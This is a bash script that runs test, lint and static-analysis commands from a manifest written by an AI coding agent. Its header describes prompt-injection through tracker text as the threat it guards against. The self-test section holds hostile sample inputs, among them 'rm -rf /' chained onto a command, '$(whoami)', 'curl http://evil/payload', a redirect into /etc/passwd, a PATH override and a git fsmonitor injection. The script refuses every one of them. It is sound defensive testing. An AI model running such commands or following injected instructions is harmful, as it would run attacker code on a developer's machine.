#!/usr/bin/env bash
# run-validation.sh — execute a validation manifest deterministically and report
# the result as machine-readable JSON.
#
# Why this exists
#   Validating a change is deterministic work: run the tests covering the diff,
#   run static analysis, run the linters, read the exit codes. The pipeline used
#   to spend a whole agent session on it — a second model dispatch whose entire
#   job was to decide which commands to run and then run them. On a small change
#   that session cost more than the change did.
#
#   The implementer already knows which commands cover its own diff, so it
#   writes them into a manifest as part of its handoff, and this script runs
#   them. An LLM is then an escalation path — for a failure that needs
#   interpreting or a manifest that cannot be trusted — rather than the default
#   mechanism for running four commands.
#
# Usage
#   run-validation.sh --manifest <path|-> [--logs <dir>] [--dry-run]
#   run-validation.sh --self-test
#
#   --manifest  the validation manifest, JSON (`-` reads stdin)
#   --logs      directory for per-category logs (default: alongside the manifest
#               in `logs/`); each category writes `<logs>/<category>.log`
#   --dry-run   validate the manifest and print the plan without executing it
#
# Manifest
#   {
#     "head_sha": "abc123",
#     "tests":           ["vendor/bin/pest tests/Feature/CreateOrderTest.php"],
#     "static_analysis": ["vendor/bin/phpstan analyse app/Actions/CreateOrder.php"],
#     "lint":            ["vendor/bin/pint --test"]
#   }
#
#   `head_sha` is required and must be the commit the manifest describes. Every
#   category is optional, but a manifest with no command in any category is
#   invalid: "nothing to run" is indistinguishable from "the implementer could
#   not work out what to run", and the second must escalate rather than pass.
#
# Output (stdout, JSON)
#   {
#     "status": "passed" | "failed" | "invalid",
#     "head_sha": "abc123",
#     "checks": { "tests": "passed", "static_analysis": "passed", "lint": "skipped" },
#     "failures": [ { "category": "tests", "command": "…", "exit_code": 1, "log": "logs/tests.log" } ],
#     "escalate": true | false,
#     "escalation_reason": "…"
#   }
#
#   `escalate` is the whole point of the contract: this script decides whether a
#   model is needed, and says so in the same document that carries the result.
#
# SECURITY — why the manifest is not a shell script
#   A manifest is written by an agent whose context includes tracker text anyone
#   can write (@rules/security/general.md *Untrusted Content Boundary*). If this
#   script passed its commands to a shell, a prompt injection that reached the
#   manifest would be arbitrary code execution on the developer's machine, run
#   by a step whose whole selling point is that no human reviews it.
#
#   Three defences, all mandatory:
#     1. No shell. Every command is split on whitespace into an argv array and
#        executed directly. There is no `eval`, no `sh -c`, and no command
#        substitution — so `;`, `|`, `&&`, `$(…)`, and backticks are not
#        operators here, they are characters in an argument.
#     2. A character allow-list rejects the manifest outright when a command
#        contains any of them anyway. Defence 1 already makes them inert; this
#        turns "inert" into "refused", so a manifest that tries is visible
#        rather than merely harmless.
#     3. An executable allow-list: the first token must name one of the
#        project-local tools in project-commands.sh. `curl`, `rm`, `git`, and everything else the
#        list does not carry is refused, whatever it is passed.
#   A refusal is `status: invalid` with `escalate: true` — never a silent skip,
#   and never a pass.
#
# Project manifest
#   A project whose checks run through a tool the list does not carry names it
#   in its manifest (@rules/general/general.md *Project manifest*), read through
#   `read-manifest.sh` from the default branch, never from the working tree:
#     "validation": { "executables": ["vendor/bin/castor"] },
#     "env": { "CLAUDECODE": "1" }
#   An extra executable must be a `vendor/bin/<name>` path. `env` is exported to
#   every executed command exactly as `read-manifest.sh --env` validates it — the
#   one check every consumer of the manifest environment shares. An unacceptable
#   manifest entry refuses the whole run, exactly like an unacceptable command.
#
# Exit codes
#   0  every executed check passed
#   1  usage error
#   2  missing required tool (jq)
#   3  the manifest is invalid or refused — escalate, do not treat as a pass
#   4  a check failed — escalate for interpretation
set -euo pipefail

PROG="${0##*/}"

usage() {
  cat >&2 <<'EOF'
Usage: run-validation.sh --manifest <path|-> [--logs <dir>] [--dry-run]
       run-validation.sh --self-test

Runs a validation manifest and prints a JSON result. Exit 0 pass, 3 invalid,
4 failed. Commands are executed without a shell and must name an allow-listed
project-local tool.
EOF
}

# The categories a manifest may carry, in execution order: cheapest signal that
# localises a problem first, so a broken lint does not wait behind a suite.
CATEGORIES=(lint static_analysis tests)

# The command checks and the executor live in project-commands.sh, shared with
# run-gate.sh and verify-gate.sh, so all three refuse the same things the same
# way: ALLOWED_EXECUTABLES, SHELL_METACHARACTERS, validate_command, run_command,
# and load_project_manifest.
# shellcheck source=project-commands.sh
. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/project-commands.sh"

json_string() {
  # Escape for a JSON string literal without depending on jq being able to read
  # the value first — this runs on refusal paths where jq already declined.
  printf '%s' "$1" | LC_ALL=C sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' | tr -d '\n\r'
}

# Emit the result document and exit. Every exit path below goes through here, so
# the caller always receives one parseable document, including on a refusal.
emit() {
  local status="$1" escalate="$2" reason="$3"
  local first=1 category entry

  printf '{\n'
  printf '  "status": "%s",\n' "$status"
  printf '  "head_sha": "%s",\n' "$(json_string "${HEAD_SHA:-}")"
  printf '  "checks": {'
  for category in "${CATEGORIES[@]}"; do
    [[ "$first" -eq 1 ]] || printf ','
    first=0
    printf '\n    "%s": "%s"' "$category" "$(check_state "$category")"
  done
  printf '\n  },\n'
  printf '  "failures": ['
  first=1
  for entry in ${FAILURES[@]+"${FAILURES[@]}"}; do
    [[ "$first" -eq 1 ]] || printf ','
    first=0
    printf '\n    %s' "$entry"
  done
  [[ "$first" -eq 1 ]] || printf '\n  '
  printf '],\n'
  printf '  "escalate": %s,\n' "$escalate"
  printf '  "escalation_reason": "%s"\n' "$(json_string "$reason")"
  printf '}\n'
}

check_state() {
  local name="$1" var
  var="STATE_${name}"
  printf '%s' "${!var:-skipped}"
}

refuse() {
  local reason="$1"
  emit invalid true "$reason"
  exit 3
}

run_manifest() {
  local manifest_arg="" logs_dir="" dry_run=0

  while [[ $# -gt 0 ]]; do
    case "$1" in
    --manifest)
      [[ $# -ge 2 ]] || { usage; return 1; }
      manifest_arg="$2"
      shift 2
      ;;
    --logs)
      [[ $# -ge 2 ]] || { usage; return 1; }
      logs_dir="$2"
      shift 2
      ;;
    --dry-run)
      dry_run=1
      shift
      ;;
    *)
      echo "$PROG: unknown argument: $(safe_display "$1")" >&2
      usage
      return 1
      ;;
    esac
  done

  [[ -n "$manifest_arg" ]] || { usage; return 1; }

  local manifest
  if [[ "$manifest_arg" == "-" ]]; then
    manifest="$(cat)"
  elif [[ -r "$manifest_arg" ]]; then
    manifest="$(cat -- "$manifest_arg")"
  else
    echo "$PROG: cannot read manifest: $(safe_display "$manifest_arg")" >&2
    return 1
  fi

  FAILURES=()
  HEAD_SHA=""

  if ! printf '%s' "$manifest" | jq -e . >/dev/null 2>&1; then
    refuse 'manifest is not valid JSON'
  fi

  HEAD_SHA="$(printf '%s' "$manifest" | jq -r '.head_sha // ""')"
  if [[ ! "$HEAD_SHA" =~ ^[0-9a-f]{7,40}$ ]]; then
    refuse 'manifest carries no valid head_sha'
  fi

  if [[ -z "$logs_dir" ]]; then
    if [[ "$manifest_arg" == "-" ]]; then
      logs_dir="logs"
    else
      logs_dir="$(dirname -- "$manifest_arg")/logs"
    fi
  fi

  load_project_manifest || refuse "$PROJECT_REFUSAL"

  # --- Validate every command before running any of them ---------------------
  #
  # All-or-nothing on purpose: a manifest whose third command is refused must
  # not have already run the first two. Half-executed validation is the state
  # nobody can act on.
  local category command reason total=0
  local -a plan=()
  for category in "${CATEGORIES[@]}"; do
    while IFS= read -r command; do
      [[ -n "$command" ]] || continue
      total=$((total + 1))
      if ! reason="$(validate_command "$command" 2>&1 >/dev/null)"; then
        refuse "$category: $(safe_display "$reason") — $(safe_display "$command")"
      fi
      plan+=("$category|$command")
    done < <(printf '%s' "$manifest" | jq -r --arg c "$category" '.[$c] // [] | .[]')
  done

  if [[ "$total" -eq 0 ]]; then
    refuse 'manifest carries no commands — validation scope could not be determined'
  fi

  if [[ "$dry_run" -eq 1 ]]; then
    local item
    for item in ${PROJECT_ENV[@]+"${PROJECT_ENV[@]}"}; do
      printf 'env|%s\n' "$item" >&2
    done
    for item in "${plan[@]}"; do
      printf '%s\n' "$item" >&2
    done
    emit passed false 'dry run — nothing was executed'
    return 0
  fi

  mkdir -p -- "$logs_dir"

  # --- Execute ---------------------------------------------------------------
  local failed=0 item log status
  for category in "${CATEGORIES[@]}"; do
    log="$logs_dir/$category.log"
    for item in "${plan[@]}"; do
      [[ "${item%%|*}" == "$category" ]] || continue
      command="${item#*|}"

      set +e
      run_command "$command" "$log"
      status=$?
      set -e

      if [[ "$status" -ne 0 ]]; then
        failed=1
        printf -v STATE_"$category" '%s' failed
        FAILURES+=("{ \"category\": \"$category\", \"command\": \"$(json_string "$command")\", \"exit_code\": $status, \"log\": \"$(json_string "$log")\" }")
      elif [[ "$(check_state "$category")" != "failed" ]]; then
        printf -v STATE_"$category" '%s' passed
      fi
    done
  done

  if [[ "$failed" -eq 1 ]]; then
    emit failed true 'a validation command failed — the failure needs interpretation'
    return 4
  fi

  emit passed false ''
  return 0
}

SELF_TEST_TMP=""
# Reached only through `trap cleanup_self_test EXIT`; ShellCheck does not credit a trap as an
# invocation (SC2317, and SC2329 in 0.11), so both are suppressed.
# shellcheck disable=SC2317,SC2329
cleanup_self_test() {
  [[ -n "$SELF_TEST_TMP" ]] && rm -rf "$SELF_TEST_TMP"
  return 0
}

self_test() {
  local failures=0 script
  script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$PROG"
  SELF_TEST_TMP="$(mktemp -d)"
  trap cleanup_self_test EXIT
  local tmp="$SELF_TEST_TMP"

  # A fake project tree: `vendor/bin/pest` is a stub whose exit code the test
  # controls, so the runner's contract is exercised without a real suite.
  mkdir -p "$tmp/project/vendor/bin"
  cat >"$tmp/project/vendor/bin/pest" <<'STUB'
#!/usr/bin/env bash
# Exits 0 unless asked for a failure, so one stub covers both paths.
[[ "${1:-}" == "--fail" ]] && { echo "1 failed"; exit 1; }
echo "ok"
STUB
  cat >"$tmp/project/vendor/bin/pint" <<'STUB'
#!/usr/bin/env bash
echo "style ok"
STUB
  chmod +x "$tmp/project/vendor/bin/pest" "$tmp/project/vendor/bin/pint"

  # Assert the exit code AND the reported status — a runner that exits 0 while
  # reporting "failed" is worse than one that only gets the code wrong.
  #
  # The manifest arrives as ONE argument and this function writes it. An earlier
  # version nested `"$(writemanifest "…")"` inside the argument list, and bash
  # 3.2 re-parsed the outer quoting whenever the inner JSON interpolated a
  # variable carrying quotes — the substitution expanded twice and every
  # assertion compared a file path against an exit code.
  verdict() {
    local label="$1" json="$2" expected_exit="$3" expected_status="$4" expected_escalate="${5:-}"
    local manifest="$tmp/manifest-$RANDOM$RANDOM.json"
    printf '%s' "$json" >"$manifest"

    local out actual status escalate
    set +e
    out="$(cd "${VERDICT_PROJECT:-$tmp/project}" && "$script" --manifest "$manifest" --logs "${VERDICT_LOGS:-$tmp/logs}" 2>/dev/null)"
    actual=$?
    set -e
    status="$(printf '%s' "$out" | jq -r '.status // "none"' 2>/dev/null || printf 'unparseable')"
    # `.escalate // "none"` is a jq trap: `//` treats `false` as absent, so a correct
    # `"escalate": false` reads back as "none". Test for the key instead.
    escalate="$(printf '%s' "$out" | jq -r 'if has("escalate") then .escalate else "none" end' 2>/dev/null || printf 'unparseable')"

    if [[ "$actual" -ne "$expected_exit" || "$status" != "$expected_status" ]]; then
      printf 'FAIL  %-54s expected %s/%s, got %s/%s\n' "$label" "$expected_exit" "$expected_status" "$actual" "$status" >&2
      failures=$((failures + 1))
      return 0
    fi
    if [[ -n "$expected_escalate" && "$escalate" != "$expected_escalate" ]]; then
      printf 'FAIL  %-54s expected escalate=%s, got %s\n' "$label" "$expected_escalate" "$escalate" >&2
      failures=$((failures + 1))
      return 0
    fi
    printf 'ok    %-54s exit %s, %s\n' "$label" "$actual" "$status"
  }

  # --- Success ---------------------------------------------------------------
  verdict 'a passing manifest passes' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest tests/FooTest.php"], "lint": ["vendor/bin/pint --test"] }' \
    0 passed false

  # --- Failure ---------------------------------------------------------------
  verdict 'a failing command fails and escalates' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest --fail"] }' 4 failed true

  # --- Invalid ---------------------------------------------------------------
  verdict 'malformed JSON is invalid' '{ not json' 3 invalid true
  verdict 'a missing head_sha is invalid' \
    '{ "tests": ["vendor/bin/pest tests/FooTest.php"] }' 3 invalid true
  verdict 'an empty manifest is invalid, never a pass' \
    '{ "head_sha": "abc1234" }' 3 invalid true

  # --- Refusals: the manifest is not a shell script --------------------------
  #
  # Each of these is a real injection shape. The runner never invokes a shell,
  # so none of them would execute — they are refused so an attempt is visible.
  verdict 'a chained command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest; rm -rf /"] }' 3 invalid true
  verdict 'a piped command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest | tee /tmp/x"] }' 3 invalid true
  # The `$(whoami)` must reach the runner as literal text — that is the payload
  # under test, so single quotes here are the point rather than an oversight.
  # shellcheck disable=SC2016
  verdict 'command substitution is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest $(whoami)"] }' 3 invalid true
  verdict 'a backgrounded command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest & curl http://evil"] }' 3 invalid true
  verdict 'a redirect is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest > /etc/passwd"] }' 3 invalid true
  verdict 'a non-allow-listed executable is refused' \
    '{ "head_sha": "abc1234", "tests": ["curl http://evil/payload"] }' 3 invalid true
  verdict 'rm is refused however it is spelled' \
    '{ "head_sha": "abc1234", "lint": ["rm -rf vendor"] }' 3 invalid true
  verdict 'an absolute path is refused' \
    '{ "head_sha": "abc1234", "tests": ["/bin/sh -c uname"] }' 3 invalid true
  verdict 'traversal out of the project is refused' \
    '{ "head_sha": "abc1234", "tests": ["../../../bin/sh"] }' 3 invalid true
  verdict 'a quoted argument is refused rather than mis-split' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest --filter \u0027a b\u0027"] }' 3 invalid true

  # One refused command refuses the whole manifest — a partially-run validation
  # is a state nobody can act on.
  # A log directory of its own: the passing case above already wrote lint.log, so
  # asserting against the shared one measured that run rather than this refusal.
  VERDICT_LOGS="$tmp/refusal-logs"
  verdict 'one bad command refuses the whole manifest' \
    '{ "head_sha": "abc1234", "lint": ["vendor/bin/pint --test"], "tests": ["curl http://evil"] }' 3 invalid true
  VERDICT_LOGS=""
  if [[ -e "$tmp/refusal-logs/lint.log" ]]; then
    printf 'FAIL  %-54s the allowed command ran before the refusal\n' 'refusal happens before execution' >&2
    failures=$((failures + 1))
  else
    printf 'ok    %-54s nothing executed\n' 'refusal happens before execution'
  fi

  # --- Project manifest ------------------------------------------------------
  #
  # The castor stub fails unless the probe variable reaches it, so the passing
  # case proves both the allow-list extension and the exported environment.
  unset RUN_VALIDATION_PROBE
  manifest_project() {
    local dir="$1" committed="$2"
    mkdir -p "$dir/vendor/bin"
    cat >"$dir/vendor/bin/castor" <<'STUB'
#!/usr/bin/env bash
[[ "${RUN_VALIDATION_PROBE:-}" == "manifest-env" ]] || { echo "probe missing"; exit 1; }
echo "castor ok"
STUB
    chmod +x "$dir/vendor/bin/castor"
    git -C "$dir" init -q
    printf '%s\n' "$committed" >"$dir/composer.json"
    git -C "$dir" add composer.json
    git -C "$dir" -c user.name=t -c user.email=t@t commit -q -m manifest
    git -C "$dir" update-ref refs/remotes/origin/master HEAD
  }

  manifest_project "$tmp/manifest" '{ "extra": { "ai-olympus": { "validation": { "executables": ["vendor/bin/castor"] }, "env": { "RUN_VALIDATION_PROBE": "manifest-env" } } } }'
  VERDICT_PROJECT="$tmp/manifest"
  verdict 'a manifest executable runs with the manifest env' \
    '{ "head_sha": "abc1234", "lint": ["vendor/bin/castor php-ai"] }' 0 passed false
  printf '%s\n' '{ "extra": { "ai-olympus": { "validation": { "executables": ["vendor/bin/castor", "vendor/bin/evil"] } } } }' >"$tmp/manifest/composer.json"
  verdict 'an executable only the working tree lists is refused' \
    '{ "head_sha": "abc1234", "lint": ["vendor/bin/evil"] }' 3 invalid true

  manifest_project "$tmp/no-env" '{ "extra": { "ai-olympus": { "validation": { "executables": ["vendor/bin/castor"] } } } }'
  VERDICT_PROJECT="$tmp/no-env"
  verdict 'without the manifest env the same command fails' \
    '{ "head_sha": "abc1234", "lint": ["vendor/bin/castor php-ai"] }' 4 failed true

  manifest_project "$tmp/outside" '{ "extra": { "ai-olympus": { "validation": { "executables": ["curl"] } } } }'
  VERDICT_PROJECT="$tmp/outside"
  verdict 'a manifest executable outside vendor/bin refuses the run' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest"] }' 3 invalid true

  manifest_project "$tmp/path-env" '{ "extra": { "ai-olympus": { "env": { "PATH": "/tmp/evil" } } } }'
  VERDICT_PROJECT="$tmp/path-env"
  verdict 'a manifest env that redirects PATH refuses the run' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest"] }' 3 invalid true

  manifest_project "$tmp/git-env" '{ "extra": { "ai-olympus": { "env": { "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.fsmonitor" } } } }'
  VERDICT_PROJECT="$tmp/git-env"
  verdict 'a manifest env that injects git configuration refuses the run' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest"] }' 3 invalid true

  manifest_project "$tmp/value-env" '{ "extra": { "ai-olympus": { "env": { "FOO": "a b" } } } }'
  VERDICT_PROJECT="$tmp/value-env"
  verdict 'a manifest env value with a space refuses the run' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest"] }' 3 invalid true
  VERDICT_PROJECT=""

  # --- Usage -----------------------------------------------------------------
  usage_error() {
    local label="$1"
    shift
    local actual
    set +e
    "$script" "$@" >/dev/null 2>&1
    actual=$?
    set -e
    if [[ "$actual" -eq 1 ]]; then
      printf 'ok    %-54s exit 1\n' "$label"
    else
      printf 'FAIL  %-54s expected exit 1, got %s\n' "$label" "$actual" >&2
      failures=$((failures + 1))
    fi
  }

  usage_error 'unknown flag is a usage error' --nonsense
  usage_error 'unreadable manifest is a usage error' --manifest "$tmp/nope.json"

  if [[ "$failures" -gt 0 ]]; then
    echo "run-validation self-test: $failures failure(s)" >&2
    return 4
  fi
  echo 'run-validation self-test: PASS'
  return 0
}

if [[ "${1:-}" == "--self-test" ]]; then
  if ! command -v jq >/dev/null 2>&1; then
    echo "$PROG: required tool not found: jq" >&2
    exit 2
  fi
  self_test
  exit $?
fi

if ! command -v jq >/dev/null 2>&1; then
  echo "$PROG: required tool not found: jq" >&2
  exit 2
fi

run_manifest "$@"
